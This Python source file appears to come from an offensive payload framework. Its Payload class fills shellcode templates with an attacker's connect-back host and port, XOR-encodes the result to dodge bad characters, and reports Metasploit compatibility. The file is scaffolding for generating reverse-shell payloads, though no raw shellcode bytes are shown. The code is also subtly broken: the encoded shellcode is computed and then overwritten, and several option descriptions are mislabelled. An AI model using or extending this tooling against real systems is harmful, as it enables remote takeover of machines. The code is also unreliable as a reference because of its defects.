from extra_functions.xor_encode import Encoder
from extra_functions.set_address_shellcodes import get_address
from struct import pack
from socket import inet_aton


class Payload():
    def __init__(self, shellcode, size, use_metaploit=False, info_metasploit="", arq="x64"):
        self.shellcode = shellcode
        self.size = size
        self.use_metaploit = use_metaploit
        self.info_metasploit = info_metasploit
        self.arq = str(arq)        
    
    def get_info_metasploit(self):
        if not self.use_metaploit:
            return "This payload is not compatible with Metasploit"
        return "Compatible with Metasploit: " + self.info_metasploit
        
    def get_shellcode(self, port, host):
        if self.module.options["encode"][1]:
            sh_aux = self.shellcode % (pack(">h",int(port)), inet_aton(host))
            enc = Encoder(sh_aux,self.arq, self.module.options["badchars"][1])
            sh_aux = enc.execute()
        sh_aux = self.shellcode % (get_address(port, host))
        return sh_aux

    def set_module(self, module):
        self.module = module
        for k, v in self.get_options().items():
            self.module.options[k] = v

    def get_options(self):
        return {
            "encode": ["Host to connect the shell", False, False],
            "lhost": ["Host to connect the shell", "", True],
            "lport": ["Port to connect the shell", "", True],
            "badchars": ["Port to connect the shell (example \\x00,\\xab)", "\\x00", True]
        }
    
    def get_size(self):
        return self.size
    
    def metasploit_compatible(self):
        return self.use_metaploit
